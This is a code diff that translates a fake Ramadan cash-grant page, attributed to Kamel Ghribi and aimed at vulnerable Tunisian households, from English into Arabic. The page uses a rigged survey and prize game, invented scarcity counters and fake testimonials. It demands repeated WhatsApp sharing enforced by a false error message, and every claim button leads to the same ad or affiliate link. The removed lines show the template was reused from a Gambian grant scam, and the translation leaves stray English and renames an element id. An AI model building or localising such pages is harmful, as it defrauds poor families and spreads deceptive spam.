@@ -295,40 +295,40 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">مبروك! تم حفظ إجاباتك</h2>
  
 <p class="paragraph">
-Now you have a chance to receive KAMEL GHRIBI 50,000 TND RAMADAN CASH SUPPORT<br><br>
-You have 3 chances ! we wish you good luck
+الآن لديك فرصة للحصول على منحة رمضان نقدية بقيمة 50,000 دينار تونسي من KAMEL GHRIBI<br><br>
+لديك 3 محاولات! نتمنى لك حظًا موفقًا
 <br><br>
-You need to select the box that has the gift inside the boxes.
+يجب عليك اختيار الصندوق الذي يحتوي على الهدية من بين الصناديق.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+ابدأ
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">حظًا أوفر في المرة القادمة</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+لديك (2) محاولات إضافية. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
-OK
+حسنًا
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTnMIj_7SUR2VMnkQH0YGhP-IV8IldyeNtRo1zJec26W8BuN-LZyOLu02qJL6GZDcFnYNrRxqF1O1ag2mHGF2m_f_sj8rHQheau3Ih31903L4ZG07YvKcTFd_Y7v9GuxbAPNqF0Qj7kmbKnwTLabnJ7EsZDqZIrn47fbfnY6KvcFVmL3jPU0CPKxyNpsBD/s16000/Captoooooure-removebg-preview.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">مبروك! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> 50,000 TND cash</b><br>Follow the instructions on the next page to claim your prize ! 
+جائزتك هي: <b> 50,000 دينار تونسي نقدًا</b><br>اتبع التعليمات في الصفحة التالية لاستلام جائزتك! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
-Ok
+حسنًا
 </button>
 </vue-modal>
   
@@ -341,12 +341,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDI2znt2zpfKbGgwdO3gVUvGAW3QjZaIYbqjx74HZFAIrYfE06GFX-31x-LqMWUNI3tqYSoEjeGzqtMgmllDOhO1n1Q_A0AQw2twkagauavGXJQ9cKWpM7BvC6YLz5dFUE2MvT2xo6TRdLrNTsy5udeCBRaW7k1cTAfc1aXenRJJfhbYxmM1ge5sYamDlX/w640-h426/uudyw.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+مرحبًا!
 </h1>
   <p class="paragraph">
-Welcome to <b>50,000 TND KAMEL GHRIBI RAMADAN SUPPORT FOR ALL VULNERABLE HOUSEHOLDS/b>, Accept this KAMEL GHRIBI 2026 RAMADAN CASH SUPPORT FOR ALL VULNERABLE HOUSEHOLDS IN TUNISIA.
+مرحبًا بك في <b>منحة رمضان 50,000 دينار تونسي من KAMEL GHRIBI لجميع الأسر الهشة</b>، اقبل منحة رمضان النقدية 2026 من KAMEL GHRIBI لجميع الأسر الهشة في تونس.
 <br>
-Answer the questions below to claim <b>50,000 TND Cash Support</b>
+أجب على الأسئلة أدناه للمطالبة بـ <b>منحة نقدية بقيمة 50,000 دينار تونسي</b>
 </p>
   <br>
   
@@ -357,58 +357,58 @@ Answer the questions below to claim <b>50,000 TND Cash Support</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "يرجى الانتظار لحظة...",
+              "يرجى الانتظار لحظة...",
+              "يرجى الانتظار لحظة..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+لقد أجبت على 4/4 من الأسئلة
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+يتم الآن معالجة إجاباتك
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+لا تزال هناك جوائز متاحة!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+جاري البحث عن الهدايا.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (389) gifts remain!
+تبقى فقط (389) هدية!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+يتم التحقق من المخزون
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of TUNISIA?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "هل أنت مواطن تونسي؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
             },
                                                              {
-              title: "Do you have a TUNISIAN ID?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "هل لديك بطاقة هوية تونسية؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "اختر جنسك؟",
+              answers: [ { text: "ذكر" }, { text: "أنثى" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
+              title: "اختر الفئة العمرية؟",
+              answers: [ { text: "18 - 20 سنة" }, { text: "21 - 25 سنة" }, { text: "26 - 30 سنة" }, { text: "30 سنة فما فوق" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -420,20 +420,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>مبروك! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDI2znt2zpfKbGgwdO3gVUvGAW3QjZaIYbqjx74HZFAIrYfE06GFX-31x-LqMWUNI3tqYSoEjeGzqtMgmllDOhO1n1Q_A0AQw2twkagauavGXJQ9cKWpM7BvC6YLz5dFUE2MvT2xo6TRdLrNTsy5udeCBRaW7k1cTAfc1aXenRJJfhbYxmM1ge5sYamDlX/w640-h426/uudyw.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>50,000 TND </b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">جائزتك هي: <b>50,000 دينار تونسي </b> <br>اتبع التعليمات أدناه لاستلام جائزتك!</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your Cash Grant</p></div>
+<div id="lastapp"><p class="rules">1. شارك مع 5 مجموعات / 15 صديقًا على "Whatsapp" (اضغط على أيقونة "Whatsapp" أدناه)</p><p class="rules">2. اضغط على "Continue" واستلم منحتك النقدية</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">استمر في المشاركة حتى يمتلئ الشريط الأزرق!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -444,7 +444,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                متابعة
                             </div>
    
   </div></div>
@@ -455,34 +455,34 @@ Stock is being checked
 
   
                       
-    <div id="claim">
+    <div id="مطالبة">
       <div class="title1">
-<p>Congratulations! </p>
+<p>مبروك! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTnMIj_7SUR2VMnkQH0YGhP-IV8IldyeNtRo1zJec26W8BuN-LZyOLu02qJL6GZDcFnYNrRxqF1O1ag2mHGF2m_f_sj8rHQheau3Ih31903L4ZG07YvKcTFd_Y7v9GuxbAPNqF0Qj7kmbKnwTLabnJ7EsZDqZIrn47fbfnY6KvcFVmL3jPU0CPKxyNpsBD/s16000/Captoooooure-removebg-preview.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>50,000 TND  cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">جائزتك هي: <b>50,000 دينار تونسي نقدًا.</b> <br>اتبع التعليمات أدناه للمطالبة بجائزتك!</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM 50,000 TND </font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">استلم 50,000 دينار تونسي </font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">اختر نوع الحساب</div><br/> <br/>
 
 	     <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">ادخار</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">جاري</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw 50,000 TND </div> 
+            <div class="share_main_bt" id="offers">سحب 50,000 دينار تونسي </div> 
       <br>
           
        
@@ -526,7 +526,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "حدث خطأ!\nلم يتم احتساب المشاركات. ربما قمت بالمشاركة مع نفس الصديق أو المجموعة أكثر من مرة، يرجى إعادة المشاركة.",
             cpa = "https://obqj2.com/4/1322937",
             cpa1 = "https://obqj2.com/4/1322937",
             saved = "coke2",
@@ -535,10 +535,10 @@ function go() {
 
 <script>
   var tiaoban = [
-"If You Missed before%0A%0A*Don't miss this KAMEL GHRIBI 50,000 TND RAMADAN CASH SUPPORT - SUPPORT For All VULNERABLE HOUSEHOLDS IN TUNISIA%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 TND instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Vdf-Initiative-Households.html ",
-"If You Missed before%0A%0A*Don't miss this VISION DEVELOPMENT IN PARTNERSHIP WITH MOMODOU TURO DARBOE 50,000 TND HOUSEHOLD SUPPORT INITIATIVE FOR VULNERABLE FAMILIES - FREE CASH GRANT For All GAMBIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 TND instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Vdf-Initiative-Households.html ",
-"If You Missed before%0A%0A*Don't miss this VISION DEVELOPMENT IN PARTNERSHIP WITH MOMODOU TURO DARBOE 50,000 TND HOUSEHOLD SUPPORT INITIATIVE FOR VULNERABLE FAMILIES - FREE CASH GRANT For All GAMBIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 TND instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Vdf-Initiative-Households.html ",
-"If You Missed before%0A%0A*Don't miss this VISION DEVELOPMENT IN PARTNERSHIP WITH MOMODOU TURO DARBOE 50,000 TND HOUSEHOLD SUPPORT INITIATIVE FOR VULNERABLE FAMILIES - FREE CASH GRANT For All GAMBIANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 TND instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Vdf-Initiative-Households.html ",
+"If فاتك العرض من قبل%0A%0A*لا تفوّت منحة رمضان النقدية 50,000 دينار تونسي من KAMEL GHRIBI - دعم لجميع الأسر الهشة في تونس%0A%0A*كيفية الحصول عليها*%0Aقم بزيارة الرابط أدناه وأجب على الأسئلة التالية وستحصل على 50,000 دينار تونسي فورًا اليوم.%0A لقد استلمت خاصتي للتو%0A%0Aاضغط هنا👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
+"If فاتك العرض من قبل%0A%0A*لا تفوّت منحة رمضان النقدية 50,000 دينار تونسي من KAMEL GHRIBI - دعم لجميع الأسر الهشة في تونس%0A%0A*كيفية الحصول عليها*%0Aقم بزيارة الرابط أدناه وأجب على الأسئلة التالية وستحصل على 50,000 دينار تونسي فورًا اليوم.%0A لقد استلمت خاصتي للتو%0A%0Aاضغط هنا👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
+"If فاتك العرض من قبل%0A%0A*لا تفوّت منحة رمضان النقدية 50,000 دينار تونسي من KAMEL GHRIBI - دعم لجميع الأسر الهشة في تونس%0A%0A*كيفية الحصول عليها*%0Aقم بزيارة الرابط أدناه وأجب على الأسئلة التالية وستحصل على 50,000 دينار تونسي فورًا اليوم.%0A لقد استلمت خاصتي للتو%0A%0Aاضغط هنا👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
+"If فاتك العرض من قبل%0A%0A*لا تفوّت منحة رمضان النقدية 50,000 دينار تونسي من KAMEL GHRIBI - دعم لجميع الأسر الهشة في تونس%0A%0A*كيفية الحصول عليها*%0Aقم بزيارة الرابط أدناه وأجب على الأسئلة التالية وستحصل على 50,000 دينار تونسي فورًا اليوم.%0A لقد استلمت خاصتي للتو%0A%0Aاضغط هنا👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -621,8 +621,8 @@ $("#offerss").click(function () {
    function tipn(){
    Swal.fire({
   icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your KAMEL GHRIBI 50,000 TND RAMADAN CASH SUPPORT, You have to share with friends about our event. Share until the blue bar is full!',
+  title: 'للأسف...',
+  text: 'لاستلام منحة رمضان النقدية 50,000 دينار تونسي من KAMEL GHRIBI، يجب عليك مشاركة الحدث مع أصدقائك. شارك حتى يمتلئ الشريط الأزرق!',
   
 });
    }
